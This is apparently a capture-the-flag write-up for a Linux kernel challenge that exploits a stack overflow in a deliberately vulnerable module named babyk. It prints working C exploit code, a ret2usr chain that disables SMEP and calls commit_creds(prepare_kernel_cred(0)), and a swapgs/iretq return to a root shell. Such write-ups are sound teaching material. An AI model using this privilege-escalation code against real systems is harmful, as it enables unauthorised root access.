# sad - detailed writeup

## Challenge summary

This was a Linux kernel exploitation challenge built around a vulnerable kernel module, not a normal userland ELF.

The challenge gives us:

- A vulnerable module source file: `module/babyk.c`
- A boot/initramfs setup: `initramfs/init`
- QEMU launch scripts: `run_qemu.sh`, `run.sh`
- A remote service: `nc sad.codevinci.it 9981`

The final exploit path is:

1. Read from `/dev/babyk` to leak:
   - `commit_creds`
   - `prepare_kernel_cred`
   - `baby_write`
   - the current task's stack canary
2. Use the `write` handler to overflow a stack buffer in kernel context
3. Overwrite the return chain with:
   - correct canary
   - saved registers
   - module helper `disable_smep`
   - a userspace function pointer
4. After SMEP is disabled, execute a userspace function in ring 0
5. Call `commit_creds(prepare_kernel_cred(0))`
6. `swapgs; iretq` back to user mode
7. Print the flag as root

Final flag:

```text
CodeVinci{ret2usr_is_so_ez}
```

---

## Files and first recon

### Commands

```bash
ls -la
find initramfs module scripts -maxdepth 3 -type f | sort
sed -n '1,220p' run_qemu.sh
sed -n '1,260p' initramfs/init
sed -n '1,260p' module/babyk.c
sed -n '1,260p' scripts/build.sh
```

### What those files mean

`run_qemu.sh` told me immediately that this is a kernel challenge:

```bash
qemu-system-x86_64 \
  -m 1024M \
  -smp 1 \
  -cpu qemu64,+smep,-smap \
  -kernel "$KERNEL" \
  -initrd "$INITRD" \
  -append "console=ttyS0 loglevel=3 oops=panic panic=1 kaslr" \
  -nographic \
  -monitor none \
  -no-reboot
```

Important consequences:

- `SMEP` is enabled
- `SMAP` is disabled
- `KASLR` is enabled
- a kernel panic kills the VM immediately

`initramfs/init` showed the runtime model:

- the module is loaded with `insmod /root/babyk.ko`
- the flag is `/root/flag`
- we are dropped into a shell as unprivileged user `ctf`
- `/dev/babyk` is the intended attack surface

That already tells us the exploit goal:

- not RIP in a userland process
- not a libc leak
- we need kernel privilege escalation to read `/root/flag`

---

## Phase 0 - remote interaction mapping

### Commands

Connect to the service:

```bash
nc sad.codevinci.it 9981
```

Once the shell prompt appears:

```sh
id
uname -a
ls -l /dev/babyk /root/flag
cat /sys/devices/system/cpu/vulnerabilities/meltdown
```

### What I learned

Typical output:

```text
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
Linux (none) 5.15.148 #1 Sat Feb 21 09:42:02 UTC 2026 x86_64 GNU/Linux
ls: /root/flag: Permission denied
crw-rw-rw-    1 root root 10, 127 /dev/babyk
Not affected
```

### Why `meltdown = Not affected` mattered

One of the first important questions was:

> Is this a full kernel ROP challenge with a KPTI trampoline, or is it intended to be a simple ret2usr challenge?

That question matters because:

- If `PTI/KPTI` is active, returning directly to a userspace address from kernel mode is usually not the easy path.
- If PTI is off, disabling SMEP and jumping to a userspace function is often enough.

`meltdown: Not affected` suggested the CPU model/runtime was probably not forcing PTI behavior. That pushed the hypothesis toward:

- leak module base
- call `disable_smep`
- ret2usr into a userspace kernel payload

That was only a hypothesis at this point, not proof.

---

## Phase 0.5 - constraints table

| Constraint | What it blocks | What it allows | What I concluded |
|------------|----------------|----------------|------------------|
| SMEP on | executing userspace pages directly from kernel | kernel-only execution until SMEP is disabled | need either kernel ROP or a helper that disables SMEP |
| SMAP off | none for this exploit | kernel can access userspace memory | ret2usr becomes attractive if SMEP can be disabled |
| KASLR on | hardcoded kernel addresses | leaks make it solvable | leak `commit_creds`, `prepare_kernel_cred`, `baby_write` |
| Stack canary on | naive stack smash | leak canary first | must read from device before writing |
| `write` capped at `0x400` | extremely long chains | medium stack payloads | plenty of room for our chain |
| Panic on oops | repeated blind testing | careful hypothesis-driven debugging | one wrong attempt kills the box |

### Key math

From the source:

- `kbuf` is `0x100`
- maximum copy is `0x400`

So the overflow is large enough, but the canary must be preserved.

---

## Phase 1 - static analysis of the module

### Source

`module/babyk.c` is short enough to understand completely.

### `baby_read`

Relevant code:

```c
static ssize_t baby_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
    struct {
        char data[0x100];
        unsigned long cc;
        unsigned long pkc;
        unsigned long bw;
        unsigned long marker;
        unsigned long canary;
    } leak;

    memset(leak.data, 'A', sizeof(leak.data));
    leak.cc = (unsigned long)commit_creds;
    leak.pkc = (unsigned long)prepare_kernel_cred;
    leak.bw = (unsigned long)baby_write;
    leak.marker = 0xdeadbeefcafebabeULL;
    leak.canary = current->stack_canary;

    if (count > LEAK_MAX)
        count = LEAK_MAX;

    if (copy_to_user(buf, &leak, count))
        return -EFAULT;

    return count;
}
```

This is an absurdly strong leak. It gives us:

- a kernel text leak: `commit_creds`
- another kernel text leak: `prepare_kernel_cred`
- a module text leak: `baby_write`
- the exact stack canary for the current task

This immediately answers four common kernel-pwn problems:

- How do I defeat KASLR? Leak function pointers.
- How do I defeat module randomization? Leak `baby_write`.
- How do I defeat the canary? Leak `current->stack_canary`.
- How do I know I parsed the structure correctly? The marker `0xdeadbeefcafebabe`.

### `baby_write`

Relevant code:

```c
static ssize_t baby_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
{
    char kbuf[0x100];
    volatile unsigned long guard = 0xabad1deaUL;

    if (count > 0x400)
        count = 0x400;

    if (__copy_from_user(kbuf, buf, count))
        return -EFAULT;

    if (guard == 0x1337)
        pr_info("babyk: guard hit\n");

    return count;
}
```

This is the vulnerability:

- `kbuf` is `0x100`
- `count` can be `0x400`
- `__copy_from_user(kbuf, buf, count)` will overflow far past `kbuf`

### `disable_smep`

Relevant code:

```c
static noinline __used void disable_smep(void)
{
    unsigned long cr4;

    asm volatile("mov %%cr4, %0" : "=r"(cr4));
    cr4 &= ~(X86_CR4_SMEP);
    asm volatile("mov %0, %%cr4" :: "r"(cr4) : "memory");
}
```

This helper is the biggest hint in the whole challenge.

### Why this helper is such a big clue

This was the second important question:

> Why leak `baby_write` specifically if I already leak `commit_creds` and `prepare_kernel_cred`?

Answer:

- `commit_creds` and `prepare_kernel_cred` solve KASLR
- `baby_write` solves module base
- module base gives access to `disable_smep`

That strongly suggests the intended path is:

- compute module base from `baby_write`
- jump to `disable_smep`
- then execute userspace code in ring 0

That is a classic ret2usr pattern.

---

## Phase 1.5 - first confusion and first wrong path

### What confused me

At first, I built the module locally against my host kernel headers:

```bash
make -C /lib/modules/$(uname -r)/build M=$PWD/module modules
objdump -d -Mintel module/babyk.ko | sed -n '/<baby_write>/,/<.*>:/p'
nm -n module/babyk.ko | grep -E 'baby_write|disable_smep'
```

That local disassembly showed a larger frame with extra saved registers above the canary.

Based on that, I initially thought the overflow layout was:

```text
buffer -> canary -> rbx -> r12 -> r13 -> rbp -> rip
```

That turned out to be wrong for the actual challenge build.

### Why it was wrong

My host build used:

- different compiler
- different kernel headers/build flags
- different environment than the challenge's Ubuntu 22.04 / 5.15.148 build

That kind of "close enough" disassembly is useful for ideas, but not for the final offset when the exploit target is a kernel stack frame.

### What happened when I used the wrong frame

My first exploit attempt crashed the remote immediately.

That was not random bad luck. It had a specific root cause:

- I wrote too many saved-register slots
- the return address landed in the wrong place
- the kernel returned to garbage and died

This is exactly the kind of mistake that happens when you trust an approximate local build for stack layout.

---

## Phase 2 - build the exact challenge artifacts

The repository build process was meant to generate the real kernel and module:

```bash
./scripts/build.sh
```

I also used a containerized Ubuntu 22.04 build environment because the host machine was missing some native build dependencies.

### Useful command

```bash
docker run --rm \
  -v "$PWD:/challenge" \
  -w /challenge \
  ubuntu:22.04 \
  bash -lc '
    apt-get update &&
    DEBIAN_FRONTEND=noninteractive apt-get install -y \
      build-essential bc bison flex libssl-dev libelf-dev libncurses-dev \
      curl xz-utils bzip2 cpio qemu-system-x86 socat musl-tools \
      binutils file git ca-certificates nano ncurses-term &&
    chmod +x ./scripts/*.sh ./run.sh ./run_qemu.sh &&
    ./scripts/build.sh
  '
```

Even before the full build completed successfully, it already left the most important artifacts behind:

- `build/kernel/vmlinux`
- `build/kernel/.config`
- `build/kernel/System.map`
- rebuilt `module/babyk.ko`

### Commands

```bash
find build -maxdepth 3 \( -name 'vmlinux' -o -name '.config' -o -name 'System.map' -o -name 'babyk.ko' \) | sort
file build/kernel/vmlinux module/babyk.ko
grep -E 'CONFIG_PAGE_TABLE_ISOLATION|CONFIG_X86_SMEP|CONFIG_X86_SMAP|CONFIG_STACKPROTECTOR' build/kernel/.config
objdump -d -Mintel module/babyk.ko | sed -n '/<baby_write>/,/<.*>:/p'
nm -n module/babyk.ko | grep -E 'baby_write|disable_smep'
```

### Why the exact build mattered

This solved the biggest confusion in the entire challenge.

The exact module disassembly was:

```asm
0000000000000000 <baby_write>:
   0:  55                      push   rbp
   1:  48 89 e5                mov    rbp,rsp
   4:  53                      push   rbx
   5:  48 8d bd f0 fe ff ff    lea    rdi,[rbp-0x110]
   c:  48 81 ec 10 01 00 00    sub    rsp,0x110
  13:  65 48 8b 04 25 28 00    mov    rax,QWORD PTR gs:0x28
  1a:  00 00
  1c:  48 89 45 f0             mov    QWORD PTR [rbp-0x10],rax
  ...
  7f:  48 81 c4 10 01 00 00    add    rsp,0x110
  86:  4c 89 c0                mov    rax,r8
  89:  5b                      pop    rbx
  8a:  5d                      pop    rbp
  8b:  c3                      ret
```

And the exact symbol offsets were:

```text
baby_write   = 0x0
disable_smep = 0x13c
```

### The real frame layout

From this exact build:

- `kbuf` starts at `rbp-0x110`
- canary is stored at `rbp-0x10`
- saved `rbx` is at `rbp-0x8`
- saved `rbp` is at `rbp`
- saved `rip` is at `rbp+0x8`

That means the overflow payload must be:

```text
offset 0x000: buffer filler
offset 0x100: canary
offset 0x108: saved rbx
offset 0x110: saved rbp
offset 0x118: saved rip -> disable_smep
offset 0x120: next rip  -> kernel_payload
```

This was the real root cause of the first failure.

---

## Phase 2.5 - confirming PTI / ret2usr viability

### Confusion

I was not fully comfortable assuming ret2usr would work.

The natural question was:

> Do I need a KPTI trampoline, or is plain ret2usr enough here?

### Why I concluded plain ret2usr was enough

Two strong signals:

1. Remote runtime:

```sh
cat /sys/devices/system/cpu/vulnerabilities/meltdown
```

gave:

```text
Not affected
```

2. Exact kernel config:

```bash
grep -E 'CONFIG_PAGE_TABLE_ISOLATION' build/kernel/.config
```

returned nothing.

So this challenge did not require a KPTI trampoline. The intended path really was:

- disable SMEP
- execute userspace code in ring 0
- return with `swapgs; iretq`

---

## Phase 3 - exploit design

### Leak structure

The read result is:

```c
struct baby_leak {
    char data[0x100];
    uint64_t commit_creds;
    uint64_t prepare_kernel_cred;
    uint64_t baby_write;
    uint64_t marker;
    uint64_t canary;
};
```

### How each leaked field is used

- `commit_creds`
  - call target for privilege escalation
- `prepare_kernel_cred`
  - returns a root credential structure
- `baby_write`
  - lets us compute module base and therefore `disable_smep`
- `marker`
  - sanity check that parsing is correct
- `canary`
  - stack smash bypass

### Core exploit idea

1. Open `/dev/babyk`
2. Read the leak structure
3. Save current userland state:
   - `cs`
   - `ss`
   - `rsp`
   - `rflags`
4. Build a stack-smash payload:
   - `A * 0x100`
   - leaked canary
   - fake saved `rbx`
   - fake saved `rbp`
   - `disable_smep`
   - pointer to `kernel_payload`
5. `write()` the payload into `/dev/babyk`
6. `baby_write` returns into `disable_smep`
7. `disable_smep` returns into `kernel_payload`
8. `kernel_payload` runs in ring 0 from userspace memory
9. `kernel_payload` calls:

```c
commit_creds(prepare_kernel_cred(0));
```

10. `kernel_payload` performs:

```asm
swapgs
push user_ss
push user_rsp
push user_rflags
push user_cs
push user_rip
iretq
```

11. Back in user mode, the process is root and can print the flag

---

## Why `swapgs; iretq` is needed

This is the part many people remember vaguely but not precisely.

### Question

> Why can't I just call `commit_creds` and `ret` back normally?

Because after ret2usr, we are executing a normal userspace function as kernel code.

We are still in:

- CPL 0
- kernel context
- kernel GS state

To cleanly return to user mode we need to restore a proper privilege transition frame.

### Correct order for `iretq`

For returning from ring 0 to ring 3 on x86_64, the stack needs:

```text
SS
RSP
RFLAGS
CS
RIP
```

So the assembly pushes exactly those values and then executes `iretq`.

`swapgs` is needed before returning because syscall/interrupt entry switched GS base to the kernel one.

---

## Exploit implementation

The final exploit source is in `exploit/exploit.c`.

### Important parts

#### Save user state

```c
static void save_user_state(void)
{
    asm volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "mov %%rsp, %2\n"
        "pushfq\n"
        "pop %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}
```

#### Return target after privilege escalation

```c
void pop_root_shell(void)
{
    if (getuid() != 0) {
        errx(1, "privilege escalation failed");
    }

    execl("/bin/sh", "sh", "-c", "id; cat /root/flag; echo __PWNED__", NULL);
    err(1, "execl");
}
```

#### Ring 0 payload in userspace memory

```c
static void kernel_payload(void)
{
    uint64_t cred;

    cred = ((uint64_t (*)(uint64_t))prepare_kernel_cred_addr)(0);
    ((void (*)(uint64_t))commit_creds_addr)(cred);

    asm volatile(
        "swapgs\n"
        "push %0\n"
        "push %1\n"
        "push %2\n"
        "push %3\n"
        "push %4\n"
        "iretq\n"
        :
        : "r"(user_ss),
          "r"(user_rsp),
          "r"(user_rflags),
          "r"(user_cs),
          "r"(pop_root_shell)
        : "memory");
    __builtin_unreachable();
}
```

#### Stack smash payload

```c
chain[0] = canary;
chain[1] = 0x4141414141414141ULL; /* saved rbx */
chain[2] = 0x4242424242424242ULL; /* saved rbp */
chain[3] = module_base + BABYK_DISABLE_SMEP_OFF;
chain[4] = (uint64_t)kernel_payload;
```

---

## The guest compiler confusion

I also tested whether I could upload source and compile inside the VM.

### Commands that exposed the issue

```sh
which gcc cc base64
gcc -print-file-name=include
find /usr/lib/gcc -name stdarg.h 2>/dev/null | head
printf '#include <stdio.h>\nint main(){puts("hi");}\n' >/tmp/t.c
gcc -isystem /usr/lib/gcc/11/include /tmp/t.c -o /tmp/t
gcc -fno-use-linker-plugin -isystem /usr/lib/gcc/11/include /tmp/t.c -o /tmp/t
find /usr/lib /lib -name Scrt1.o 2>/dev/null | head -5
find /usr/lib/gcc -name crtbegin.o 2>/dev/null | head -5
```

### What was broken

The copied in-guest GCC was incomplete:

- builtin include search was wrong
- `liblto_plugin.so` was missing
- startup objects like `Scrt1.o` were missing

That meant the cleanest solve path was not "upload source and compile remotely".

Instead, I compiled the exploit locally and uploaded the binary.

### Why a locally compiled dynamic binary worked

I verified the local binary only needed:

```text
GLIBC_2.2.5
GLIBC_2.34
```

Ubuntu 22.04 in the challenge uses glibc 2.35, so the uploaded dynamic binary was compatible with the remote guest.

Useful check:

```bash
objdump -T exploit/exploit.bin | grep GLIBC_
ldd exploit/exploit.bin
```

---

## Dynamic verification in pwndbg

I did not need heavy live debugging for the final solve, but this is the exact kind of minimal pwndbg session I would use to verify the critical hypothesis:

> What is the exact stack layout above `kbuf` in the real challenge build?

### Step 1 - start QEMU with a GDB stub locally

Add `-s -S` to the QEMU command line, or run QEMU manually:

```bash
qemu-system-x86_64 \
  -m 1024M \
  -smp 1 \
  -cpu qemu64,+smep,-smap \
  -kernel build/bzImage \
  -initrd build/initramfs.cpio.gz \
  -append "console=ttyS0 loglevel=3 oops=panic panic=1 kaslr" \
  -nographic \
  -monitor none \
  -no-reboot \
  -s -S
```

### Step 2 - attach pwndbg

```bash
gdb -q build/kernel/vmlinux
```

Inside pwndbg:

```gdb
target remote :1234
set pagination off
```

### Step 3 - resolve the module text address

If you can obtain the leaked `baby_write` address from your userland program, compute:

```text
module_base = baby_write_leak - BABYK_BABY_WRITE_OFF
```

Then the return site worth breaking near is:

```text
baby_write_epilogue = baby_write_leak + 0x6b
```

because the exact disassembly showed:

```asm
6b: mov r8, rbx
...
7f: add rsp, 0x110
86: mov rax, r8
89: pop rbx
8a: pop rbp
8b: ret
```

### Step 4 - useful pwndbg commands

Set the breakpoint:

```gdb
b *<baby_write_leak + 0x6b>
c
```

Inspect the frame:

```gdb
p/x $rbp
x/6gx $rbp-0x118
x/6gx $rbp-0x10
telescope $rbp-0x118 8
```

What you want to verify:

- `kbuf` starts at `$rbp-0x110`
- guard is at `$rbp-0x118`
- canary is at `$rbp-0x10`
- saved `rbx` is at `$rbp-0x8`
- saved `rbp` is at `$rbp`
- return address is at `$rbp+0x8`

### Why this is the right use of pwndbg here

This challenge did not need exploratory GDB.

There was only one thing worth verifying dynamically:

- the exact stack frame in the exact challenge build

Everything else was already clear from the source.

---

## Automation script

The final automation is in `solve.py`.

### What it does

1. Rebuild module offsets from the exact `module/babyk.ko`
2. Compile `exploit/exploit.c` locally into `exploit/exploit.bin`
3. Connect to `sad.codevinci.it:9981`
4. Wait for the `/ $ ` prompt
5. Base64-encode the local binary
6. Upload it to `/tmp/exploit` in chunks
7. `chmod +x /tmp/exploit`
8. Run `/tmp/exploit`
9. Print the root shell output and flag

### Run it

```bash
python3 solve.py
```

Expected successful output:

```text
uid=0(root) gid=0(root)
CodeVinci{ret2usr_is_so_ez}__PWNED__
```

---

## What specifically went wrong on the first attempt

This part is worth remembering because it is a very common kernel-pwn failure mode.

### Wrong assumption

I trusted a host-built module disassembly for the final stack layout.

### What I expected

I expected:

```text
buffer -> canary -> rbx -> r12 -> r13 -> rbp -> rip
```

### What the exact build actually had

It was only:

```text
buffer -> canary -> rbx -> rbp -> rip
```

### Effect

That shifted my return chain forward by 16 bytes and caused the kernel to return to garbage.

### Lesson

For stack-frame offsets in kernel exploitation:

- a "similar local build" is not good enough
- use the exact challenge build if possible

---

## Why this challenge is easy once you see the intended path

The challenge author basically hands you the whole exploit:

- canary leak
- kernel function leaks
- module function leak
- a SMEP-disabling helper
- SMAP already disabled

So the intended thought process is:

1. Read the source carefully
2. Notice `disable_smep`
3. Realize the challenge wants ret2usr
4. Preserve the canary
5. Build the correct tiny return chain

This is why the flag is literally:

```text
CodeVinci{ret2usr_is_so_ez}
```

---

## Final exploit checklist for future reference

When I see a kernel module challenge like this again, I want to ask these exact questions:

1. Do I have a direct canary leak?
2. Do I have a kernel text leak?
3. Do I have a module text leak?
4. Is there an obvious helper function like `disable_smep`?
5. Is SMAP off?
6. Is PTI actually on in the real build, or only something I vaguely assumed?
7. Did I verify the exact stack frame in the exact challenge build?

If the answers are:

- canary leak = yes
- function pointer leak = yes
- module base leak = yes
- SMEP helper = yes
- SMAP off = yes
- PTI off = yes

then the challenge is almost certainly:

```text
ret2usr after disable_smep
```

and not full kernel ROP.

---

## Commands cheat sheet

### Recon

```bash
ls -la
find initramfs module scripts -maxdepth 3 -type f | sort
sed -n '1,260p' module/babyk.c
sed -n '1,260p' initramfs/init
sed -n '1,220p' run_qemu.sh
```

### Remote environment

```bash
nc sad.codevinci.it 9981
```

Inside the VM:

```sh
id
uname -a
ls -l /dev/babyk /root/flag
cat /sys/devices/system/cpu/vulnerabilities/meltdown
```

### First-pass module build on host

```bash
make -C /lib/modules/$(uname -r)/build M=$PWD/module modules
objdump -d -Mintel module/babyk.ko | sed -n '/<baby_write>/,/<.*>:/p'
nm -n module/babyk.ko | grep -E 'baby_write|disable_smep'
```

### Exact build artifacts

```bash
find build -maxdepth 3 \( -name 'vmlinux' -o -name '.config' -o -name 'System.map' -o -name 'babyk.ko' \) | sort
grep -E 'CONFIG_PAGE_TABLE_ISOLATION|CONFIG_X86_SMEP|CONFIG_X86_SMAP|CONFIG_STACKPROTECTOR' build/kernel/.config
objdump -d -Mintel module/babyk.ko | sed -n '/<baby_write>/,/<.*>:/p'
nm -n module/babyk.ko | grep -E 'baby_write|disable_smep'
```

### Local solve

```bash
python3 solve.py
```

### pwndbg verification

```gdb
target remote :1234
set pagination off
b *<baby_write_leak + 0x6b>
c
p/x $rbp
x/6gx $rbp-0x118
x/6gx $rbp-0x10
telescope $rbp-0x118 8
```

---

## Final answer

This challenge is a textbook ret2usr kernel exploit:

- leak canary and kernel/module addresses from `read`
- overflow `write`
- return into `disable_smep`
- execute a userspace ring-0 payload
- call `commit_creds(prepare_kernel_cred(0))`
- `swapgs; iretq` back to userland
- read the flag

Flag:

```text
CodeVinci{ret2usr_is_so_ez}
```
